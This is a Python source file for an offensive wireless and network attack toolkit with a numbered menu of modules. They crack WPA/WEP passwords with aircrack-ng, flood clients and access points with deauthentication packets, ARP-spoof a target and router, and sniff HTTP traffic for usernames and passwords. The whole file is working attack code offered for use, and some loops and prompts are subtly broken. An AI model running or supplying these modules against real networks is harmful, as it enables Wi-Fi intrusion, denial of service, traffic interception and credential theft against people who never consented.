#!/usr/bin/python3
# Author: dagg0rath
# https://github.com/dagg0rath

## Imports ##
import subprocess, time, sys, re, os
from colorama import Fore,Style
import readline
import scapy.all as scapy
import socket
from datetime import datetime

def main():
	def wpa_crack():
		print("[+] This module requires a wordlist, you can generate one using the built-in module of this toolkit or use an existing one")
		try:
			print(Fore.MAGENTA + "[+] Use Ctrl + c at any time to proceed" + Style.RESET_ALL)
			interface = input(Fore.YELLOW + "[?] Please specify the interface you wish to use: ")
			subprocess.run(["ifconfig", interface, "down"])
			# Kill processes in network
			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
			subprocess.run(["iwconfig", interface, "mode", "monitor"])
			subprocess.run(["ifconfig", interface, "up"])
			try:
				print("[?] Check for 2G or 5G networks?")
				print("--------------------------------")
				print("[1] 2.4 Ghz Networks")
				print("[2] 5 Ghz Networks")
				band = int(input("[3] Both bands (slower speed)\n" + Style.RESET_ALL))
				if band == 1:
					subprocess.run(["sudo", "airodump-ng", interface])
				elif band ==2:
					subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
				elif band ==3:
					subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
				else:
					print(Fore.MAGENTA + "[-] None of the above chosen, quitting program" + Style.RESET_ALL)
			except ValueError:
				print(Fore.MAGENTA + "[-] None of the above chosen, quitting program"+ Style.RESET_ALL)
		except KeyboardInterrupt:
			try:
				print(Fore.YELLOW + "[?] Please specify the details of your desired network:")
				print("-------------------------------------------------------")
				bssid = input("[?] Router MAC address: ")
				channel = input("[?] Channel used: ")
				print("[+] Ctrl + c to proceed when you wish" + Style.RESET_ALL)

				subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])

			except KeyboardInterrupt:
				try:
					print(Fore.MAGENTA + "[+] Run Target deauth attack module on a client to disconnect them to proceed"+ Style.RESET_ALL)
					cap_file = input("\n[?] Please specify the name of the CAP file you wish to use: ")
					print("[+] Ctrl + c to proceed to crack CAP file when handshake has been captured")				
					subprocess.run(["sudo", "airodump-ng", "-w", cap_file, "-c", channel, "--bssid", bssid, interface])
				except KeyboardInterrupt:
					try:
						print(f"[-] Program finished, CAP file stored as {cap_file}.\n\n")
						wordlist = input("[?] Please, specify the path of the wordlist you wish to use: ")
						cap = cap_file + "-01.cap"
						subprocess.run(["sudo", "aircrack-ng", cap, "-w", wordlist])
					except KeyboardInterrupt:
						print(Fore.MAGENTA + "[-] Program interrumpted by user, quitting..." + Style.RESET_ALL)
		back_m()

	def wep_crack():
		try:
			print(Fore.MAGENTA + "[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack." + Style.RESET_ALL)
			interface = input(Fore.YELLOW + "[?] Please specify the interface you wish to use: " + Style.RESET_ALL)
			subprocess.run(["ifconfig", interface, "down"])
			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
			subprocess.run(["iwconfig", interface, "mode", "monitor"])
			subprocess.run(["ifconfig", interface, "up"])
			subprocess.run(["sudo","airodump-ng", interface, "--encrypt", "wep"])
		except KeyboardInterrupt:
			try:
				print("[?] Please specify the details of your desired network:")
				print("-------------------------------------------------------")
				bssid = input("[?] Router MAC address: ")
				channel = input("[?] Channel used: ")
				file = input("[?] File name you wish to use for .cap file: ")
				print("[+] Ctrl + c to proceed when you wish")

				subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel,"--write", file, interface])

			except KeyboardInterrupt:
				try:
					print(f"[=] {file} generated, cracking password...\n\n")
					subprocess.run(["sudo", "aircrack-ng", file])
				except KeyboardInterrupt:
					print("[-] Program finished by user, quitting...\n\n")
		back_m()

	def deauth_attack():
		print("[?] Do you wish to scan networks or skip to attack")
		print("--------------------------------------------------")
		print("[1] Scan")
		choice = int(input("[2] Skip to attack\n"))
		if choice == 1:
			try:
				print("\n[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
				interface = input("\n[?] Please specify the interface you wish to use: ")
				subprocess.run(["ifconfig", interface, "down"])
				# Kill processes in network
				subprocess.run(["sudo", "airmon-ng", "check", "kill"])
				subprocess.run(["iwconfig", interface, "mode", "monitor"])
				subprocess.run(["ifconfig", interface, "up"])
				try:
					print("[?] Check for 2G or 5G networks?")
					print("--------------------------------")
					print("[1] 2.4 Ghz Networks")
					print("[2] 5 Ghz Networks")
					band = int(input("[3] Both bands (slower speed)\n"))
					if band == 1:
						subprocess.run(["sudo", "airodump-ng", interface])
					elif band ==2:
						subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
					elif band ==3:
						subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
					else:
						print("[-] None of the above chosen, quitting program")
				except ValueError:
					print("[-] None of the above chosen, quitting program")
			except KeyboardInterrupt:
				try:
					print("[?] Please specify the details of your desired network:")
					print("-------------------------------------------------------")
					bssid = input("[?] Access Point BSSID: ")
					channel = input("[?] Channel used: ")
					print("[+] Ctrl + c to proceed when you wish")

					subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, interface])

				except KeyboardInterrupt:
					try:
						target_bssid = input("[?] Client MAC address you wish to target: ")
						print("[=] Running Deauth attack...\n\n")

						subprocess.run(["sudo", "aireplay-ng", "--deauth", "100000000000", "-a", bssid, "-c", target_bssid, interface])
					except KeyboardInterrupt:
						print("[-] Program finished, quitting...\n\n")
		elif choice == 2:
			try:
				interface = input("\n[?] Please specify the interface you wish to use: ")
				subprocess.run(["sudo", "airmon-ng", "check", "kill"])
				subprocess.run(["iwconfig", interface, "mode", "monitor"])
				subprocess.run(["ifconfig", interface, "up"])

				bssid = input("[?] Router BSSID address: ")
				target_bssid = input("[?] Client MAC address you wish to target: ")
				channel = input("[?] Channel used: ")

				subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
				subprocess.run(["sudo", "aireplay-ng", "--deauth", "100000000000", "-a", bssid, "-c", target_bssid, interface])
			except KeyboardInterrupt:
				print("[-] Program finished, quitting...\n\n")
		else:
			print("[-] None chosen, quitting...")
		
		back_m()

	def net_scan():
		print(Fore.YELLOW + "[?] Please enter the range of your subnet: ")
		ip_range = input(Fore.MAGENTA + "[+] Format: 192.168.1.1/24\n" + Style.RESET_ALL)
		
		arp_result = scapy.arping(ip_range)
		print("-------------------------------------")
		print("  MAC address	    Vendor  IP\n\n")
		print(Fore.MAGENTA + "[-] Scan finished. If it failed to discover clients, run it again\n\n" + Style.RESET_ALL)
		back_m()

	def port_scan():
		target = input("[?] Specify the target ip address: ")
		print("-----------------------------------------")
		print("Scanning target: " + target)
		print("Time started: " + str(datetime.now()))
		print("-----------------------------------------\n")
		
		# SCANNER FUNCTION
		def scanner(port):
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.settimeout(0.5)
				sock.connect((target, port))
				sock.close()
				return True
			except:
				return False
		print("\n[=] Scanning common ports...")
		print("----------------------------")

		# Common Ports
		common_ports = {
		 
			'21': 'FTP',
			'22': 'SSH',
			'23': 'TELNET',
			'25': 'SMTP',
			'53': 'DNS',
			'69': 'TFTP',
			'80': 'HTTP',
			'109': 'POP2',
			'110': 'POP3',
			'123': 'NTP',
			'137': 'NETBIOS-NS',
			'138': 'NETBIOS-DGM',
			'139': 'NETBIOS-SSN',
			'143': 'IMAP',
			'156': 'SQL-SERVER',
			'389': 'LDAP',
			'443': 'HTTPS',
			'546': 'DHCP-CLIENT',
			'547': 'DHCP-SERVER',
			'995': 'POP3-SSL',
			'993': 'IMAP-SSL',
			'2086': 'WHM/CPANEL',
			'2087': 'WHM/CPANEL',
			'2082': 'CPANEL',
			'2083': 'CPANEL',
			'3306': 'MYSQL',
			'8443': 'PLESK',
			'10000': 'VIRTUALMIN/WEBMIN'
		}

		for p, service in common_ports.items():
			port = int(p)
			result = scanner(port)
			if result == True:
				print("[+] Port "+ p + " running " + service +" service, is open!")
			else:
				pass

		# RANGE SCAN
		try:
			print("\n[?] Do you wish to scan a specific port range:")
			print("------------------------------------------------")
			print("[1] Port Range")
			print("[2] Quit")
			question = int(input("------------------------------------------------\n"))

			# RANGE
			if question == 1:
				print("\nPORT Ranges")
				print("----------------")
				print("[1] 1-500 ")
				print("[2] 500-1000")
				print("[3] 1000-1500")
				print("[4] 1500-2000")
				print("[5] 2000-2500")
				print("[6] 2500-3000")
				print("[7] 3000-3500")
				print("[8] 3500-4000")
				print("[9] 4000-4500")
				print("[10] 4500-5000")
				print("[11] 5000-5500")
				print("[12] 5500-6000")
				print("[13] 6000-6500")
				print("[14] 6500-7000")
				print("[15] 7000-7500")
				print("[16] 7500-8000")
				print("[17] 8000-8500")
				print("[18] 8500-9000")
				print("[19] 9000-9500")
				print("[20] 9500-10000")
				print("----------------")
				range_choosen = int(input("[+] What's the desired range you wish to scan 1 - 20: "))
				print("\n")
				if range_choosen == 1:
					for i in range(1, 500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 2:
					for i in range(500, 1000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 3:
					for i in range(1000, 1500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 4:
					for i in range(1500, 2000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 5:
					for i in range(2000, 2500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 6:
					for i in range(2500, 3000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 7:
					for i in range(3000, 3500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 8:
					for i in range(3500, 4000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 9:
					for i in range(4000, 4500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 10:
					for i in range(4500, 5000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 11:
					for i in range(5000, 5500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 12:
					for i in range(5500, 6000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 13:
					for i in range(6000, 6500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 14:
					for i in range(6500, 7000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 15:
					for i in range(7000, 7500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 16:
					for i in range(8500, 8000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 17:
					for i in range(8000, 8500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 18:
					for i in range(8500, 9000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 19:
					for i in range(9000, 9500):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
				if range_choosen == 20:
					for i in range(9500, 10000):
						result = scanner(i)
						if result == True:
							print("[+] Port "+ str(i) + " is open!" )
						else:
							pass
			elif question == 2:
				print("[-] Goodbye")		
			else:
				print("[-] None chosen, Goodbye!\n\n")		
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting...\n\n")
		except ValueError:
			print("\n[-] None chosen, Goodbye!\n\n")
		back_m()

	def ap_dos():
		try:
			print("[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
			interface = input("[?] Please specify the interface you wish to use: ")
			subprocess.run(["ifconfig", interface, "down"])
			# Kill processes in network
			subprocess.run(["sudo", "airmon-ng", "check", "kill"])
			subprocess.run(["iwconfig", interface, "mode", "monitor"])
			subprocess.run(["ifconfig", interface, "up"])

			print("[?] Do you wish to scan networks or skip to attack")
			print("------------------------------------------------------")
			print("[1] Scan")
			choice = int(input("[2] Skip to attack\n"))
			if choice == 1:
				try:
					print("[?] Check for 2G or 5G networks?")
					print("--------------------------------")
					print("[1] 2.4 Ghz Networks")
					print("[2] 5 Ghz Networks")
					band = int(input("[3] Both bands (slower speed)\n"))
					if band == 1:
						subprocess.run(["sudo", "airodump-ng", interface])
					elif band ==2:
						subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
					elif band ==3:
						subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
					else:
						print("[-] None of the above chosen, quitting program")
				except ValueError:
					print("[-] None of the above chosen, quitting program")
				except KeyboardInterrupt:
					try:
						bssid = input("[?] Access Point BSSID: ")
						channel = input("[?] Channel used: ")
						subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
						print("\n[=] Running Deauth attack...\n\n")
						subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface])
					except KeyboardInterrupt:
						print("[-] Program finished, quitting...\n\n")
			elif choice == 2:
				try:
					bssid = input("[?] Access Point BSSID: ")
					channel = input("[?] Channel used: ")
					subprocess.run(["sudo", "airmon-ng", "start", interface, channel])
					print("\n[=] Running Deauth attack...\n\n")
					subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface])
				except KeyboardInterrupt:
					print("[-] Program finished, quitting...\n")
			else:
				print("[-] None of the above chosen, quitting program")
		except KeyboardInterrupt:
			print("[-] Program interrumpted by user, quitting...\n\n")

		except ValueError:
			print("[-] None of the above chosen, quitting program")		
				
	def mac_changer():
		interface = input(Fore.YELLOW + "[?] Please input the name of the interface you wish to change it's MAC address: " + Style.RESET_ALL)
		os.system(f'sudo ifconfig {interface} down')
		os.system(f'sudo macchanger -A {interface}')
		os.system(f'ifconfig {interface} up')
			
	def bluetooth():
		interface = input(Fore.YELLOW + "[?] Please input the interface you wish to use: "+ Style.RESET_ALL)
		subprocess.run(["sudo", "hciconfig", "up"])
		
		print(Fore.YELLOW + "\n[=] Scanning bluetooth devices nearby..." + Style.RESET_ALL)
		print("----------------------------------------\n")
		subprocess.run(["sudo", "hcitool", "scan"])
		
		target = input(Fore.YELLOW + "\n[?] Please specify the MAC address of your desired target: "+ Style.RESET_ALL)
		
		print(Fore.YELLOW + "\n[=] Gathering information about target device..."+ Style.RESET_ALL)
		print("------------------------------------------------\n")
		subprocess.run(["sudo", "hcitool", "info", target])
		print("\n\n")
		try:
			option = input(Fore.YELLOW + "[?] You wish to ping the device (Y/n): "+ Style.RESET_ALL)
			if option.upper() == "Y":
				print(Fore.YELLOW + "\n[=] Sending ping to target device..."+ Style.RESET_ALL)
				print("------------------------------------\n")
				subprocess.run(["sudo", "l2ping", target])
				print("\n\n")
			else:
				print("\n[-] Program reached end, quitting...\n\n")
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting...\n\n")
		except ValueError:
			print("\n Wrong value type given, quitting...\n\n")

	def psswd_url_sniff():	
		import scapy.all as scapy
		from scapy.layers import http
		print(Fore.RED + "[+] Rember to run an ARP spoofing attack on target before running this attack" + Style.RESET_ALL)
		try:
			
			def sniff(interface):
				scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")
			
			def get_url(packet):
				return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

			def get_login(packet):
				if packet.haslayer(scapy.Raw):
						load = str(packet[scapy.Raw].load)
						keywords = ["username", "password", "user", "passwd", "usr", "login", "pass"]
						for keyword in keywords:
							if keyword in load:
								return load

			def process_sniffed_packet(packet):
				if packet.haslayer(http.HTTPRequest):
					
					url = get_url(packet)
					print(Fore.YELLOW + "[+] HTTPRequest >> " + Style.RESET_ALL + url.decode())

					login_info = get_login(packet)
					if login_info:
						print(Fore.RED + "\n[+] Possible login info >> "+ Style.RESET_ALL + login_info + "\n")
					
			interface = input(Fore.YELLOW + "[?] Interface you wish to use for sniffing attack: "+ Style.RESET_ALL)
			print(Fore.CYAN + "[=] Sniffer running...\n\n" + Style.RESET_ALL)
			sniff(interface) 
		except KeyboardInterrupt:
			print("\n[-] Program ended by user, quitting...\n\n")

	def arp_spoof():
		import scapy.all as scapy
		print(Fore.RED + "[+] Run echo 1 > /proc/sys/net/ipv4/ip_forward as root user before sending attack" + Style.RESET_ALL)
		def get_mac(ip):
			arp_request = scapy.ARP(pdst=ip)
			broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
			arp_request_broadcast = broadcast/arp_request
			answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
			
			return answered_list[0][1].hwsrc

		def spoof(target_ip, spoof_ip):
			target_mac = get_mac(target_ip)
			# Create ARP packet and send it to target
			packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
			scapy.send(packet, verbose=False)

		def restore(dest_ip, src_ip):
			dest_mac = get_mac(dest_ip)
			src_mac = get_mac(src_ip)
			packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
			scapy.send(packet, verbose=False)

		router_ip = input(Fore.YELLOW + "[?] Enter the target ip address: " + Style.RESET_ALL)
		target_ip = input(Fore.RED + "[?] Enter the router ip address: " + Style.RESET_ALL)

		sent_packets_count = 0 
		try:
			while True:
				spoof(target_ip, router_ip)
				spoof(router_ip, target_ip)
				sent_packets_count = sent_packets_count + 2
				print(Fore.YELLOW + "\r[=] Packets sent: " + str(sent_packets_count), end=""+ Style.RESET_ALL)
				time.sleep(2)
		except KeyboardInterrupt:
			restore(target_ip, router_ip)
			print("\n[-] Program ended by user, quitting and restorin ARP tables...\n\n")


#############################################################
	def logo():
		print(Fore.YELLOW + """
____________ _____ _   _  ______ _____ 
| ___ \ ___ \  _  | \ | ||___  /|  ___|
| |_/ / |_/ / | | |  \| |   / / | |__  
| ___ \    /| | | | . ` |  / /  |  __| 
| |_/ / |\ \\  |_| / |\  |./ /___| |___ 
\____/\_| \_|\___/\_| \_/\_____/\____/ 
 _____ _____ _____ _   __ ___________  
/  ___|  ___|  ___| | / /|  ___| ___ \ 
\ `--.| |__ | |__ | |/ / | |__ | |_/ / 
 `--. \  __||  __||    \ |  __||    /  
/\__/ / |___| |___| |\  \| |___| |\ \  
\____/\____/\____/\_| \_/\____/\_| \_| """)

	def back_m():
		time.sleep(1)
		menu = int(input(Fore.YELLOW + """
[?]--Return to main menu?
-------------------------
[01]--Yes
[02]--No
"""))
		if menu == 1:
			print(Fore.YELLOW + "[+]--Returning to main menu...")
			time.sleep(2)
			os.system("clear")
			logo()
			main_menu()
		else:
			print(Fore.MAGENTA + "[-]--Quitting..." + Style.RESET_ALL)

	def main_menu():
		try:
			choice = int(input("""
[?]--Welcome! Choose one of the options below:
-----------------------------------------------
[01]--WPA/WPA2 Password Cracking
[02]--WEP Cracking
[03]--Client Deauth Attack
[04]--Access Point DoS attack
[05]--Subnet Network Scanner
[06]--Port Scanner
[07]--MAC address changer
[08]--Bluetooth Scanner
[09]--ARP Spoofing
[10]--URL/PSSWD Sniffer
""" + Fore.MAGENTA + """[00]--Quit
""" + Style.RESET_ALL))
			if choice == 1:
				wpa_crack()
			elif choice == 2:
				wep_crack()
			elif choice == 3:
				deauth_attack()
			elif choice == 4:
				ap_dos()
			elif choice == 5:
				net_scan()
			elif choice == 6:
				port_scan()
			elif choice == 7:
				mac_changer()
			elif choice == 8:
				bluetooth()
			elif choice == 9:
				arp_spoof()
			elif choice == 10:
				psswd_url_sniff()
			else:
				print("[-] Goodbye...")
		except KeyboardInterrupt:
			print("[-] Program interrumpted by user, quitting...")
		except ValueError:
			print("[-] Wrong value given, quitting...")

	os.system('clear')
	logo()
	main_menu()

def is_root():
    return os.geteuid() == 0
sudo = is_root()
if sudo == True:
	main()
else:
	print(Fore.YELLOW + "\n[-] Please, run this toolkit as sudo" + Fore.WHITE)
